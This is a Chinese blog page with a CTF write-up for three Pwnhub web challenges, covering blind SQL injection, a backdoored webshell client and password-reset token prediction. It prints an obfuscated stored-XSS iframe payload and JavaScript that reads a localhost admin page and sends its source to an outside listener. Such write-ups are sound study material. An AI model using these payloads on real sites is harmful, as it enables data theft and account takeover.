@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Pwnhub杯几道题Writeup | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="第一次认真地打比赛。 简陋的博客点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：http://54.223.247.98:8023/?a=article&amp;amp;page=1和http://54.223.247.98:8023/?a=article&amp;amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnhub杯几道题Writeup">
+<meta property="og:url" content="http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="第一次认真地打比赛。 简陋的博客点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：http://54.223.247.98:8023/?a=article&amp;amp;page=1和http://54.223.247.98:8023/?a=article&amp;amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://120.25.80.195:7230/05/3332961668.jpg">
+<meta property="og:updated_time" content="2017-08-20T00:55:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnhub杯几道题Writeup">
+<meta name="twitter:description" content="第一次认真地打比赛。 简陋的博客点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：http://54.223.247.98:8023/?a=article&amp;amp;page=1和http://54.223.247.98:8023/?a=article&amp;amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入">
+<meta name="twitter:image" content="http://120.25.80.195:7230/05/3332961668.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简陋的博客"><span class="toc-text">简陋的博客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-grasp-is-gold-catch-up-is-running-water"><span class="toc-text">Time, grasp is gold, catch up is running water.</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-Pwnhub杯几道题WriteUp" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Pwnhub杯几道题Writeup</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.08.19</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>第一次认真地打比赛。</p>
+<h3 id="简陋的博客"><a href="#简陋的博客" class="headerlink" title="简陋的博客"></a>简陋的博客</h3><p>点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：<a href="http://54.223.247.98:8023/?a=article&amp;page=1和http://54.223.247.98:8023/?a=article&amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入测试，进行一轮FUZZ之后牺牲惨烈，几乎所有的符号都被过滤了。这时候想到文章说的对POST也进行了过滤，那就试试把参数放到post中。测试下来发现a和page可以使用post传参，a参数只过滤了单引号，page参数如何测试都无法验证过滤了什么。" target="_blank" rel="noopener">http://54.223.247.98:8023/?a=article&amp;page=1和http://54.223.247.98:8023/?a=article&amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入测试，进行一轮FUZZ之后牺牲惨烈，几乎所有的符号都被过滤了。这时候想到文章说的对POST也进行了过滤，那就试试把参数放到post中。测试下来发现a和page可以使用post传参，a参数只过滤了单引号，page参数如何测试都无法验证过滤了什么。</a></p>
+<p><img src="http://120.25.80.195:7230/05/3332961668.jpg" alt="1.jpg"></p>
+<p>对a测试时，发现a是表名。表名是不可以被单引号包裹的，但表名可以被反引号包裹，本题也是如此。输入一个单引号就会报错。进行了一顿报错后，猜测查询语句为 select * from <code>sqli.输入点</code> where <code>id</code>=’输入点’。在报错信息中也发现page参数经过了intval()处理。</p>
+<p>还有一个点是在出字段名时，表名称需要单引号包裹，用16进制绕过。</p>
+<p>最后的payload：</p>
+<p>url：<code>http://54.223.247.98:8023/?&amp;page=1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最终使用盲注，一位一位跑，返回页面的两种大小为布尔值，得到flag。`SYC&#123;O0o._O0o._O0o._O0o._O0o.&#125;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 中国菜刀</span><br><span class="line"></span><br><span class="line">这道题要分析菜刀后门。本来以为要逆出源码，小伙伴指点，抓包即可。于是在自己的服务器上放一个马，用下载的菜刀连上去，抓包。</span><br><span class="line"></span><br><span class="line">![2.jpg][2]</span><br><span class="line"></span><br><span class="line">对源码urlencode后base64_decode，出现一个网址http://118.89.225.190/shellbox.php?shell=，进入之后一片空白。最shell进行FUZZ，判断对XSS的某些payload过滤。因此判断这里是一个储存型XSS。</span><br><span class="line"></span><br><span class="line">构造payload：`&lt;IFRAME SRC=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&amp;#39;&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#104;&amp;#101;&amp;#98;&amp;#105;&amp;#99;&amp;#46;&amp;#109;&amp;#101;&amp;#47;&amp;#115;&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#47;&amp;#50;&amp;#46;&amp;#106;&amp;#115;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;&lt;/IFRAME&gt; `</span><br><span class="line"></span><br><span class="line">URL编码后访问，XSS平台收信。得到一个管理员页面shellbox_admin.php?id=2008 访问之依然是空白页面。对id进行各种测试都没有结果。此时有人提醒要看referer头。但是xss平台没有收到referer头，于是把xss payload变成一个img标签，指向监听的服务器。收到了referer头，http://127.0.0.1/shellbox_admin.php?id=2008 结合hint：flag在源码中，需要127.0.0.1访问shellbox_admin，并带出源码。</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">    var target_url=&quot;http://127.0.0.1/shellbox_admin.php?id=2008&quot;;</span><br><span class="line">    var server_url=&quot;http://x.x.x.x:7231/&quot;;</span><br><span class="line">    var xmlhttp;</span><br><span class="line">    </span><br><span class="line">    function create_xmlhttp()</span><br><span class="line">    &#123;</span><br><span class="line">    	try&#123;</span><br><span class="line">    		xmlhttp=new XMLHttpRequest;</span><br><span class="line">    	&#125;catch(err)&#123;</span><br><span class="line">    		try&#123;</span><br><span class="line">    			xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    		&#125;catch(err)&#123;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    create_xmlhttp();</span><br><span class="line">    </span><br><span class="line">    if(xmlhttp!=null)&#123;</span><br><span class="line">    	xmlhttp.onreadystatechange=state_change;</span><br><span class="line">    	xmlhttp.open(&quot;GET&quot;,target_url,true);</span><br><span class="line">    	xmlhttp.send(null);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function state_change()</span><br><span class="line">    &#123;</span><br><span class="line">    	if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;</span><br><span class="line">    		var s = new send_source(xmlhttp.responseText);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function send_source(source)</span><br><span class="line">    &#123;</span><br><span class="line">    	create_xmlhttp();</span><br><span class="line">    	var url = server_url+&quot;?source=&quot;+escape(source);</span><br><span class="line">    	xmlhttp.open(&quot;GET&quot;,url,false);</span><br><span class="line">    	xmlhttp.send(null);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>监听7231，得到源码。拿到flag <code>SYC{1_w0Nt_D0_1T_4gAin}</code></p>
+<h3 id="Time-grasp-is-gold-catch-up-is-running-water"><a href="#Time-grasp-is-gold-catch-up-is-running-water" class="headerlink" title="Time, grasp is gold, catch up is running water."></a>Time, grasp is gold, catch up is running water.</h3><p>P师傅说，50%的ctf题打开是个登录界面。</p>
+<p>进入题目一个登陆界面，有注册，登录，忘记密码几个功能。用普通用户登录后要求用管理员登录以继续做题。测试以后得到以下信息</p>
+<ol>
+<li><p>源码中有管理员邮箱</p>
+</li>
+<li><p>忘记密码之后可以在源码中得到一个用于重置密码的token</p>
+</li>
+<li><p>忘记管理员的密码不会得到一个token</p>
+</li>
+</ol>
+<p>所以思路就很明显了：利用普通用户重置密码找到token的规律，使用token重置管理员密码。</p>
+<p>token是md5(time())，在重置管理员密码的一瞬间执行一次，就得到一个token。</p>
+<p>另外，在重置密码界面提示ip在黑名单中。这里的规则是，每一个重置密码的地址只能使用一次，所以重置管理员密码的时候换一个没有使用过的ip地址即可。</p>
+<p>重置之后是用管理员进入后台。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/08/19/Mysql操作中的条件竞争漏洞/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/08/19/NSCTF 2017 Web部分 WriteUp/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
